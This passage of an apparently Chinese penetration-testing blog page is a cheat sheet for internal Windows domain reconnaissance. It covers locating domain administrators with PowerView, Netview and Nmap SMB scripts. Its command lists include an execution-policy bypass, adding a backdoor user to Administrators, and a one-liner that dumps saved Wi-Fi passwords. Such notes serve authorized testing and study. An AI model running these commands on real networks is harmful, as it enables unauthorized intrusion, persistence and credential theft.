+<li>原理：通过检验注册表里<code>HKEY_USERS</code>的key值来查询谁登陆过机器(调用<code>NetSessionEnum API</code>)</li>
+<li>限制：部分功能需要管理员权限</li>
+</ul>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">$ <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PsLoggedon</span>.</span></span>exe<br></code></pre></td></tr></table></figure>
+
+
+<h3 id="PVEFindADUser"><a href="#PVEFindADUser" class="headerlink" title="PVEFindADUser"></a>PVEFindADUser</h3><blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn">PVEFindADUser.exe</a>：用于查找Active Directory用户的登录位置、枚举域用户，以及查找在特定计算机上登陆的用户，包括本地用户、通过RDP登陆的用户、用于运行服务和计划任务的用户。</p>
+</blockquote>
+<ul>
+<li>限制：运行该工具需要配置<code>.NET Framework 2.0</code>环境，并且需要具有管理员权限。</li>
+</ul>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">$ <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PVEFindADUser</span>.</span></span>exe -current<br></code></pre></td></tr></table></figure>
+
+
+<h3 id="Netview"><a href="#Netview" class="headerlink" title="Netview"></a>Netview</h3><blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/mubix/netview">Netview.exe</a>：使用<code>WinAPI</code>枚举系统，利用<code>NetSessionEnum</code>找寻登陆会话，利用<code>NetShareEnum</code>找寻共享，利用<code>NetWkstaUserEnum</code>枚举登陆用户。同时，<code>netview.exe</code>能够查询共享入口和有价值的用户。</p>
+</blockquote>
+<ul>
+<li><p>编译版本：<a target="_blank" rel="noopener" href="https://malicious.link/projects/netview.exe">https://malicious.link/projects/netview.exe</a></p>
+</li>
+<li><p>限制：绝大多数功能不需要管理员权限</p>
+</li>
+</ul>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>netview.exe -d<br></code></pre></td></tr></table></figure>
+
+
+<h3 id="Nmap的NSE脚本"><a href="#Nmap的NSE脚本" class="headerlink" title="Nmap的NSE脚本"></a>Nmap的NSE脚本</h3><blockquote>
+<p><a target="_blank" rel="noopener" href="https://nmap.org/nsedoc/scripts/smb-enum-sessions.html">Smb-enum-sessions.nse</a>：如果存在域账户或者本地账户，就可以使用该脚本获取远程机器的登陆会话</p>
+</blockquote>
+<ul>
+<li>限制：不需要管理员权限</li>
+</ul>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$ nmap <span class="hljs-attribute">--script</span>=smb-enum-sessions 192.168.1.1<br></code></pre></td></tr></table></figure>
+<table>
+<thead>
+<tr>
+<th>脚本</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>smb-enum-domains</td>
+<td>尝试枚举系统上的域及其策略</td>
+</tr>
+<tr>
+<td>smb-enum-users</td>
+<td>枚举远程Windows系统上的用户，并提供尽可能多的信息</td>
+</tr>
+<tr>
+<td>smb-enum-shares</td>
+<td>便利远程主机共享目录</td>
+</tr>
+<tr>
+<td>smb-enum-processes</td>
+<td>通过SMB从远程服务器提取进程列表，可以知道目标主机运行哪些软件。需要管理员权限</td>
+</tr>
+<tr>
+<td>smb-enum-sessions</td>
+<td>枚举在本地或通过SMB共享登录到系统的用户</td>
+</tr>
+<tr>
+<td>smb-os-discovery</td>
+<td>尝试通过SMB协议（端口445或139）确定操作系统，计算机名称，域，工作组和当前时间。</td>
+</tr>
+</tbody></table>
+<h3 id="PowerView"><a href="#PowerView" class="headerlink" title="PowerView"></a>PowerView</h3><blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView">PowerView</a>是一款依赖powershell和WMI对内网进行查询的常用渗透测试脚本，集成在powersploit工具包中，是一个收集域信息很好用的脚本。</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 定位域管理员</span><br><span class="hljs-meta">$</span><span class="bash"> powershell.exe -<span class="hljs-built_in">exec</span> bypass -c <span class="hljs-string">&quot;Import-Module C:\PowerView.ps1; Invoke-UserHunter&quot;</span></span><br></code></pre></td></tr></table></figure>
+
+
+<h2 id="查找域管理进程"><a href="#查找域管理进程" class="headerlink" title="查找域管理进程"></a>查找域管理进程</h2><blockquote>
+<p>一个典型的域权限提升过程，通常围绕着<strong>收集明文凭据</strong>或<strong>通过<code>Mimikatz</code>提权</strong>等方法。在获取了管理员权限的系统中寻找域管理员登录进程，进而收集域管理员的凭据。</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> tasklist /v                             <span class="hljs-comment"># 列出本机的所有进程及进程用户</span><br><span class="hljs-variable">$</span> net <span class="hljs-built_in">group</span> <span class="hljs-string">&quot;Domain Admins&quot;</span> /domain       <span class="hljs-comment"># 获取域管理员列表</span><br><span class="hljs-variable">$</span> net <span class="hljs-built_in">group</span> <span class="hljs-string">&quot;Domain Controllers&quot;</span> /domain  <span class="hljs-comment"># 查询域控制器列表</span><br></code></pre></td></tr></table></figure>
+
+
+<h2 id="Powershell收集信息"><a href="#Powershell收集信息" class="headerlink" title="Powershell收集信息"></a>Powershell收集信息</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> <span class="hljs-built_in">Get-ExecutionPolicy</span>               <span class="hljs-comment"># 查看执行策略</span><br><span class="hljs-variable">$</span> <span class="hljs-built_in">Set-ExecutionPolicy</span> Unrestricted  <span class="hljs-comment"># 修改执行策略(需管理员权限)</span><br><br><span class="hljs-comment"># 利用PowerView</span><br><span class="hljs-variable">$</span> <span class="hljs-built_in">Import-Module</span> .\PowerView.ps1<br><span class="hljs-built_in">Get-NetDomain</span>            <span class="hljs-comment"># 获取当前用户所在域的名称</span><br><span class="hljs-built_in">Get-NetUser</span>              <span class="hljs-comment"># 获取所有用户的详细信息</span><br><span class="hljs-built_in">Get-NetComputer</span>          <span class="hljs-comment"># 获取域内所有机器的详细信息</span><br><span class="hljs-built_in">Get-NetShare</span>             <span class="hljs-comment"># 获取当前域内所有的共享信息</span><br><span class="hljs-built_in">Get-ADObject</span>             <span class="hljs-comment"># 获取活动目录的对象（内容超级多）</span><br><span class="hljs-built_in">Invoke-UserHunter</span>        <span class="hljs-comment"># 获取域用户登陆的计算机信息，以及该用户是否有本地管理员权限</span><br><span class="hljs-built_in">Invoke-ProcessHunter</span>     <span class="hljs-comment"># 通过查询域内所有的机器进程找到特定用户</span><br></code></pre></td></tr></table></figure>
+
+
+<h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><ul>
+<li><p>用户信息</p>
+</li>
+<li><ul>
+<li>权限：<code>system &gt; administrator &gt; user</code></li>
+</ul>
+</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> net user /domain                        <span class="hljs-comment"># 查看域用户</span><br><span class="hljs-variable">$</span> net <span class="hljs-built_in">group</span> <span class="hljs-string">&quot;domain admins&quot;</span> /domain       <span class="hljs-comment"># 查看域管理员</span><br><span class="hljs-variable">$</span> net <span class="hljs-built_in">group</span> <span class="hljs-string">&quot;domain controllers&quot;</span> /domain  <span class="hljs-comment"># 查看域控制器</span><br><span class="hljs-variable">$</span> nltest /domain_trusts  <span class="hljs-comment"># 查看域信任</span><br><br><span class="hljs-comment"># 其它</span><br><span class="hljs-variable">$</span> query user                                 <span class="hljs-comment"># 查看在线用户</span><br><span class="hljs-variable">$</span> net user                                   <span class="hljs-comment"># 查看全部用户</span><br><span class="hljs-variable">$</span> net user naraku                            <span class="hljs-comment"># 查看指定用户: net user &lt;username&gt; </span><br><span class="hljs-variable">$</span> net user naraku pwd123. /add               <span class="hljs-comment"># 添加用户,默认Users组: net user &lt;username&gt; &lt;password&gt;  /add    </span><br><span class="hljs-variable">$</span> net localgroup administrators naraku /add  <span class="hljs-comment"># 添加到Administrators组: net localgroup administrators &lt;username&gt; /add</span><br><br><span class="hljs-comment"># 查看wifi密码</span><br><span class="hljs-variable">$</span> <span class="hljs-keyword">for</span> /f <span class="hljs-string">&quot;skip=9 tokens=1,2 delims=:&quot;</span> %i <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;netsh wlan show profiles&#x27;</span>) <span class="hljs-keyword">do</span> @<span class="hljs-built_in">echo</span> %j | findstr <span class="hljs-literal">-i</span> <span class="hljs-literal">-v</span> <span class="hljs-built_in">echo</span> | netsh wlan show profiles %j key=<span class="hljs-built_in">clear</span><br></code></pre></td></tr></table></figure>
+      </section>
+      <section class="extra">
+        
+        
+        
+        
+  <nav class="nav">
+    <a href="/2021/02/21/%E8%BA%AB%E4%BB%BD%E8%AF%81%E5%90%8E6%E4%BD%8D%E5%AD%97%E5%85%B8/"><i class="iconfont iconleft"></i>Python-生成身份证后6位字典</a>
+    <a href="/2021/02/21/xss%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7/">XSS漏洞挖掘-进阶<i class="iconfont iconright"></i></a>
+  </nav>
+
+      </section>
+      
+        <section class="comments">
+  
+    <div class="btn" id="comments-btn">查看评论</div>
+  
+  
+</section>
+      
+    </section>
+  </div>
+</article></div>
+      <div class="col-xl-3">
+        
+          
+  <aside class="toc-wrap">
+    <h3 class="toc-title">文章目录：</h3>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-text">基本信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E5%BD%93%E5%89%8D%E6%9D%83%E9%99%90"><span class="toc-text">查询当前权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E5%9F%9F"><span class="toc-text">判断是否存在域</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8B%E5%9F%9F%E5%86%85%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA"><span class="toc-text">探测域内存活主机</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NetBIOS%E6%8E%A2%E6%B5%8B"><span class="toc-text">NetBIOS探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ICMP%E6%8E%A2%E6%B5%8B"><span class="toc-text">ICMP探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ARP%E6%8E%A2%E6%B5%8B"><span class="toc-text">ARP探测</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F%E5%9F%9F%E5%86%85%E7%AB%AF%E5%8F%A3"><span class="toc-text">扫描域内端口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E4%BF%A1%E6%81%AF"><span class="toc-text">域信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nltest%E4%BF%A1%E4%BB%BB%E5%9F%9F"><span class="toc-text">nltest信任域</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E5%9F%9F%E6%8E%A7"><span class="toc-text">查找域控</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF"><span class="toc-text">域用户信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1"><span class="toc-text">定位域管</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-text">概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PsLoggedOn"><span class="toc-text">PsLoggedOn</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PVEFindADUser"><span class="toc-text">PVEFindADUser</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Netview"><span class="toc-text">Netview</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap%E7%9A%84NSE%E8%84%9A%E6%9C%AC"><span class="toc-text">Nmap的NSE脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PowerView"><span class="toc-text">PowerView</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E8%BF%9B%E7%A8%8B"><span class="toc-text">查找域管理进程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Powershell%E6%94%B6%E9%9B%86%E4%BF%A1%E6%81%AF"><span class="toc-text">Powershell收集信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E5%AE%83"><span class="toc-text">其它</span></a></li></ol>
+  </aside>
+
+        
+      </div>
+    </div>
+  </div>
+</main>
+  
+
+<footer class="footer">
+  <div class="footer-social"><a 
+        href="xxx "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#12B7F5'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconQQ "></i>
+      </a><a 
+        href="UW5rdFFqRm5aREJu "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#09BB07'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconwechat-fill "></i>
+      </a><a 
+        href="https://github.com/B1gd0g "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#9f7be1'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  icongithub-fill "></i>
+      </a><a 
+        href="UWpGblpEQm5RSEJ5YjNSdmJtMWhhV3d1WTI5dA== "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color=#FF3B00" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconmail"></i>
+      </a></div>
+  
+    <div class="footer-copyright"><p>  Powered by B1gd0g  </p></div>
+  
+</footer>
+  
+      <div class="fab fab-plus">
+    <i class="iconfont iconplus"></i>
+  </div>
+  
+  
+  <div class="fab fab-up">
+    <i class="iconfont iconcaret-up"></i>
+  </div>
+  
+  
+    <div class="scrollbar j-scrollbar">
+  <div class="scrollbar-current j-scrollbar-current"></div>
+</div>
+  
+  
+    
+<script src="/js/color-mode.js"></script>
+
+  
+</body>
+
+<script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.lazyload/1.9.1/jquery.lazyload.min.js"></script>
+
+
+
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+
+
+
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.qrcode/1.0/jquery.qrcode.min.js"></script>
+
+
+
+
+<script src="/js/utils.js"></script>
+<script src="/js/script.js"></script>
+
+
+
+
+
+
+
+  <script>
+    (function () {
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      } else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+</html>
